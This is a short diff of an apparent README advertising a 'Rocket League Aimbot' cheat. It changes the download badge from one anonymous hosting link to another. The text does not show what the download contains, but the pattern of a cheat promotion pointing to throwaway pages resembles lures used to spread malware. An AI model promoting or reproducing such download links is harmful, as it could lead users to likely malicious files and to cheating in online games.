@@ -4,7 +4,7 @@ Missing open nets? Botching aerials? Struggling to land that last-second goal? W
 
 No more whiffs. No more tilts. Just perfect shots and clean dubs.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload15.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Rocket-League-Aimbot-quwi3.github.io/.github)
 ---
 
 ## 🧠 What Is the Rocket League Aimbot?
